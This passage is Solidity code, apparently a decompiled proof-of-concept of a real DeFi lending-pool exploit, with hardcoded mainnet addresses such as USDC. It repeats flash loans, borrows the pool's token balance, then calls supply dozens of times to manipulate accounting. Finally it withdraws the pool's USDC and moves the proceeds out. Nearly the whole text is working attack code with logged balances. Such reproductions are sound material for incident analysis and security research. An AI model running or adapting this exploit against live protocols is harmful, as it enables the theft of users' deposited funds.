            arr287[0] = 0;
            I(x76f0).flashLoan(r, arr285, arr286, arr287, r, hex"4141", 0);

            address[] memory arr294 = new address[](1);
            arr294[0] = xa0b8;
            uint256[] memory arr295 = new uint256[](1);
            arr295[0] = 1160272591443;
            uint256[] memory arr296 = new uint256[](1);
            arr296[0] = 0;
            I(x76f0).flashLoan(r, arr294, arr295, arr296, r, hex"4141", 0);

            address[] memory arr303 = new address[](1);
            arr303[0] = xa0b8;
            uint256[] memory arr304 = new uint256[](1);
            arr304[0] = 1160272591443;
            uint256[] memory arr305 = new uint256[](1);
            arr305[0] = 0;
            I(x76f0).flashLoan(r, arr303, arr304, arr305, r, hex"4141", 0);

            address[] memory arr312 = new address[](1);
            arr312[0] = xa0b8;
            uint256[] memory arr313 = new uint256[](1);
            arr313[0] = 1160272591443;
            uint256[] memory arr314 = new uint256[](1);
            arr314[0] = 0;
            I(x76f0).flashLoan(r, arr312, arr313, arr314, r, hex"4141", 0);

            address[] memory arr321 = new address[](1);
            arr321[0] = xa0b8;
            uint256[] memory arr322 = new uint256[](1);
            arr322[0] = 1160272591443;
            uint256[] memory arr323 = new uint256[](1);
            arr323[0] = 0;
            I(x76f0).flashLoan(r, arr321, arr322, arr323, r, hex"4141", 0);

            address[] memory arr330 = new address[](1);
            arr330[0] = xa0b8;
            uint256[] memory arr331 = new uint256[](1);
            arr331[0] = 1160272591443;
            uint256[] memory arr332 = new uint256[](1);
            arr332[0] = 0;
            I(x76f0).flashLoan(r, arr330, arr331, arr332, r, hex"4141", 0);

            address[] memory arr339 = new address[](1);
            arr339[0] = xa0b8;
            uint256[] memory arr340 = new uint256[](1);
            arr340[0] = 1160272591443;
            uint256[] memory arr341 = new uint256[](1);
            arr341[0] = 0;
            I(x76f0).flashLoan(r, arr339, arr340, arr341, r, hex"4141", 0);

            address[] memory arr348 = new address[](1);
            arr348[0] = xa0b8;
            uint256[] memory arr349 = new uint256[](1);
            arr349[0] = 1160272591443;
            uint256[] memory arr350 = new uint256[](1);
            arr350[0] = 0;
            I(x76f0).flashLoan(r, arr348, arr349, arr350, r, hex"4141", 0);

            address[] memory arr357 = new address[](1);
            arr357[0] = xa0b8;
            uint256[] memory arr358 = new uint256[](1);
            arr358[0] = 1160272591443;
            uint256[] memory arr359 = new uint256[](1);
            arr359[0] = 0;
            I(x76f0).flashLoan(r, arr357, arr358, arr359, r, hex"4141", 0);

            address[] memory arr366 = new address[](1);
            arr366[0] = xa0b8;
            uint256[] memory arr367 = new uint256[](1);
            arr367[0] = 1160272591443;
            uint256[] memory arr368 = new uint256[](1);
            arr368[0] = 0;
            I(x76f0).flashLoan(r, arr366, arr367, arr368, r, hex"4141", 0);

            address[] memory arr375 = new address[](1);
            arr375[0] = xa0b8;
            uint256[] memory arr376 = new uint256[](1);
            arr376[0] = 1160272591443;
            uint256[] memory arr377 = new uint256[](1);
            arr377[0] = 0;
            I(x76f0).flashLoan(r, arr375, arr376, arr377, r, hex"4141", 0);

            address[] memory arr384 = new address[](1);
            arr384[0] = xa0b8;
            uint256[] memory arr385 = new uint256[](1);
            arr385[0] = 1160272591443;
            uint256[] memory arr386 = new uint256[](1);
            arr386[0] = 0;
            I(x76f0).flashLoan(r, arr384, arr385, arr386, r, hex"4141", 0);

            address[] memory arr393 = new address[](1);
            arr393[0] = xa0b8;
            uint256[] memory arr394 = new uint256[](1);
            arr394[0] = 1160272591443;
            uint256[] memory arr395 = new uint256[](1);
            arr395[0] = 0;
            I(x76f0).flashLoan(r, arr393, arr394, arr395, r, hex"4141", 0);

            address[] memory arr402 = new address[](1);
            arr402[0] = xa0b8;
            uint256[] memory arr403 = new uint256[](1);
            arr403[0] = 1160272591443;
            uint256[] memory arr404 = new uint256[](1);
            arr404[0] = 0;
            I(x76f0).flashLoan(r, arr402, arr403, arr404, r, hex"4141", 0);

            address[] memory arr411 = new address[](1);
            arr411[0] = xa0b8;
            uint256[] memory arr412 = new uint256[](1);
            arr412[0] = 1160272591443;
            uint256[] memory arr413 = new uint256[](1);
            arr413[0] = 0;
            I(x76f0).flashLoan(r, arr411, arr412, arr413, r, hex"4141", 0);

            address[] memory arr420 = new address[](1);
            arr420[0] = xa0b8;
            uint256[] memory arr421 = new uint256[](1);
            arr421[0] = 1160272591443;
            uint256[] memory arr422 = new uint256[](1);
            arr422[0] = 0;
            I(x76f0).flashLoan(r, arr420, arr421, arr422, r, hex"4141", 0);

            address[] memory arr429 = new address[](1);
            arr429[0] = xa0b8;
            uint256[] memory arr430 = new uint256[](1);
            arr430[0] = 1160272591443;
            uint256[] memory arr431 = new uint256[](1);
            arr431[0] = 0;
            I(x76f0).flashLoan(r, arr429, arr430, arr431, r, hex"4141", 0);

            address[] memory arr438 = new address[](1);
            arr438[0] = xa0b8;
            uint256[] memory arr439 = new uint256[](1);
            arr439[0] = 1160272591443;
            uint256[] memory arr440 = new uint256[](1);
            arr440[0] = 0;
            I(x76f0).flashLoan(r, arr438, arr439, arr440, r, hex"4141", 0);

            address[] memory arr447 = new address[](1);
            arr447[0] = xa0b8;
            uint256[] memory arr448 = new uint256[](1);
            arr448[0] = 1160272591443;
            uint256[] memory arr449 = new uint256[](1);
            arr449[0] = 0;
            I(x76f0).flashLoan(r, arr447, arr448, arr449, r, hex"4141", 0);

            address[] memory arr456 = new address[](1);
            arr456[0] = xa0b8;
            uint256[] memory arr457 = new uint256[](1);
            arr457[0] = 1160272591443;
            uint256[] memory arr458 = new uint256[](1);
            arr458[0] = 0;
            I(x76f0).flashLoan(r, arr456, arr457, arr458, r, hex"4141", 0);

            address[] memory arr465 = new address[](1);
            arr465[0] = xa0b8;
            uint256[] memory arr466 = new uint256[](1);
            arr466[0] = 1160272591443;
            uint256[] memory arr467 = new uint256[](1);
            arr467[0] = 0;
            I(x76f0).flashLoan(r, arr465, arr466, arr467, r, hex"4141", 0);

            address[] memory arr474 = new address[](1);
            arr474[0] = xa0b8;
            uint256[] memory arr475 = new uint256[](1);
            arr475[0] = 1160272591443;
            uint256[] memory arr476 = new uint256[](1);
            arr476[0] = 0;
            I(x76f0).flashLoan(r, arr474, arr475, arr476, r, hex"4141", 0);

            address[] memory arr483 = new address[](1);
            arr483[0] = xa0b8;
            uint256[] memory arr484 = new uint256[](1);
            arr484[0] = 1160272591443;
            uint256[] memory arr485 = new uint256[](1);
            arr485[0] = 0;
            I(x76f0).flashLoan(r, arr483, arr484, arr485, r, hex"4141", 0);

            address[] memory arr492 = new address[](1);
            arr492[0] = xa0b8;
            uint256[] memory arr493 = new uint256[](1);
            arr493[0] = 1160272591443;
            uint256[] memory arr494 = new uint256[](1);
            arr494[0] = 0;
            I(x76f0).flashLoan(r, arr492, arr493, arr494, r, hex"4141", 0);

            // uint256 v3 = 10001466755107579871763;
            uint256 v3 = I(x8cc0).balanceOf(xe6b6);
            console2.log("I(x8cc0).balanceOf(xe6b6)\t->", "10001466755107579871763 (10001.4667 ether)");
            I(x76f0).borrow(x8cc0, v3, 2, 0, r);
        }
        {
            // uint256 v4 = 10001466755107579871763;
            uint256 v4 = I(x8cc0).balanceOf(r);
            console2.log("I(x8cc0).balanceOf(r)\t\t->", "10001466755107579871763 (10001.4667 ether)");
            I(x8cc0).transfer(xf60a, v4);
            // uint256 v5 = 12731091009598;
            uint256 v5 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12731091009598));
            I(xa0b8).transfer(x3a39, v5);
            x3a39.call(hex"54efa564");
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0xa1d34a66) {
            xa1d34a66();
            return;
        }
        revert("no such function");
    }
}

contract X3a39 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x658b = 0x658b0f629B9e3753AA555C189D0cB19C1eD59632;
    address constant x76f0 = 0x76F0C94Ced5B48020bf0D7f3D0CEabC877744cB5;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xba12 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address xf583;

    constructor(address a_xf583) payable {
        xf583 = a_xf583; // 0xf5836e292F716a7979F9BC5C2d3Ed59913e07962
    }

    function x54efa564() public {
        I(xa0b8).approve(x76f0, type(uint256).max);
        // uint256 v1 = 31894733256;
        uint256 v1 = I(x658b).balanceOf(xf583);
        console2.log("I(x658b).balanceOf(xf583)\t->", uint256(31894733256));
        // uint256 v2 = 1192180087724;
        uint256 v2 = I(xa0b8).balanceOf(x658b);
        console2.log("I(xa0b8).balanceOf(x658b)\t->", uint256(1192180087724));
        // uint256 v3 = 12731091009598;
        uint256 v3 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12731091009598));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v4 = 12715140453497;
        uint256 v4 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12715140453497));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v5 = 12699189897396;
        uint256 v5 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12699189897396));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v6 = 12683239341295;
        uint256 v6 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12683239341295));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v7 = 12667288785194;
        uint256 v7 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12667288785194));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v8 = 12651338229093;
        uint256 v8 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12651338229093));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v9 = 12635387672992;
        uint256 v9 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12635387672992));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v10 = 12619437116891;
        uint256 v10 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12619437116891));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v11 = 12603486560790;
        uint256 v11 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12603486560790));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v12 = 12587536004689;
        uint256 v12 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12587536004689));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v13 = 12571585448588;
        uint256 v13 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12571585448588));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v14 = 12555634892487;
        uint256 v14 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12555634892487));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v15 = 12539684336386;
        uint256 v15 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12539684336386));
        I(x76f0).supply(xa0b8, 15950556101, r, 0);
        // uint256 v16 = 12523733780285;
        uint256 v16 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12523733780285));
        {
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v17 = 12507783224184;
            uint256 v17 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12507783224184));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v18 = 12491832668083;
            uint256 v18 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12491832668083));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v19 = 12475882111982;
            uint256 v19 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12475882111982));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v20 = 12459931555881;
            uint256 v20 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12459931555881));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v21 = 12443980999780;
            uint256 v21 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12443980999780));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v22 = 12428030443679;
            uint256 v22 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12428030443679));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v23 = 12412079887578;
            uint256 v23 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12412079887578));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v24 = 12396129331477;
            uint256 v24 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12396129331477));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v25 = 12380178775376;
            uint256 v25 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12380178775376));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v26 = 12364228219275;
            uint256 v26 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12364228219275));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v27 = 12348277663174;
            uint256 v27 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12348277663174));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v28 = 12332327107073;
            uint256 v28 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12332327107073));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v29 = 12316376550972;
            uint256 v29 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12316376550972));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v30 = 12300425994871;
            uint256 v30 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12300425994871));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v31 = 12284475438770;
            uint256 v31 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12284475438770));
        }
        {
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v32 = 12268524882669;
            uint256 v32 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12268524882669));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v33 = 12252574326568;
            uint256 v33 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12252574326568));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v34 = 12236623770467;
            uint256 v34 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12236623770467));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v35 = 12220673214366;
            uint256 v35 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12220673214366));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v36 = 12204722658265;
            uint256 v36 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12204722658265));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v37 = 12188772102164;
            uint256 v37 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12188772102164));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v38 = 12172821546063;
            uint256 v38 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12172821546063));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v39 = 12156870989962;
            uint256 v39 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12156870989962));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v40 = 12140920433861;
            uint256 v40 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12140920433861));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v41 = 12124969877760;
            uint256 v41 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12124969877760));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v42 = 12109019321659;
            uint256 v42 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12109019321659));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v43 = 12093068765558;
            uint256 v43 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12093068765558));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v44 = 12077118209457;
            uint256 v44 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12077118209457));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v45 = 12061167653356;
            uint256 v45 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12061167653356));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v46 = 12045217097255;
            uint256 v46 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12045217097255));
        }
        {
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v47 = 12029266541154;
            uint256 v47 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12029266541154));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v48 = 12013315985053;
            uint256 v48 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(12013315985053));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v49 = 11997365428952;
            uint256 v49 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11997365428952));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v50 = 11981414872851;
            uint256 v50 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11981414872851));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v51 = 11965464316750;
            uint256 v51 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11965464316750));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v52 = 11949513760649;
            uint256 v52 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11949513760649));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v53 = 11933563204548;
            uint256 v53 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11933563204548));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v54 = 11917612648447;
            uint256 v54 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11917612648447));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v55 = 11901662092346;
            uint256 v55 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11901662092346));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v56 = 11885711536245;
            uint256 v56 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11885711536245));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v57 = 11869760980144;
            uint256 v57 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11869760980144));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v58 = 11853810424043;
            uint256 v58 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11853810424043));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v59 = 11837859867942;
            uint256 v59 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11837859867942));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v60 = 11821909311841;
            uint256 v60 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11821909311841));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v61 = 11805958755740;
            uint256 v61 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11805958755740));
        }
        {
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v62 = 11790008199639;
            uint256 v62 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11790008199639));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v63 = 11774057643538;
            uint256 v63 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11774057643538));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v64 = 11758107087437;
            uint256 v64 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11758107087437));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v65 = 11742156531336;
            uint256 v65 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11742156531336));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v66 = 11726205975235;
            uint256 v66 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11726205975235));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v67 = 11710255419134;
            uint256 v67 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11710255419134));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v68 = 11694304863033;
            uint256 v68 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11694304863033));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v69 = 11678354306932;
            uint256 v69 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11678354306932));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v70 = 11662403750831;
            uint256 v70 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11662403750831));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v71 = 11646453194730;
            uint256 v71 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11646453194730));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v72 = 11630502638629;
            uint256 v72 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11630502638629));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v73 = 11614552082528;
            uint256 v73 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11614552082528));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v74 = 11598601526427;
            uint256 v74 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11598601526427));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v75 = 11582650970326;
            uint256 v75 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11582650970326));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v76 = 11566700414225;
            uint256 v76 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11566700414225));
        }
        {
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v77 = 11550749858124;
            uint256 v77 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(11550749858124));
            I(x76f0).supply(xa0b8, 15950556101, r, 0);
            // uint256 v78 = 2388471795299;
            uint256 v78 = I(xa0b8).balanceOf(x658b);
            console2.log("I(xa0b8).balanceOf(x658b)\t->", uint256(2388471795299));
            I(x76f0).withdraw(xa0b8, v78, r);
            // uint256 v79 = 13923271097322;
            uint256 v79 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(13923271097322));
            I(xa0b8).transfer(xba12, v79);
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x54efa564) {
            x54efa564();
            return;
        }
        revert("no such function");
    }
}
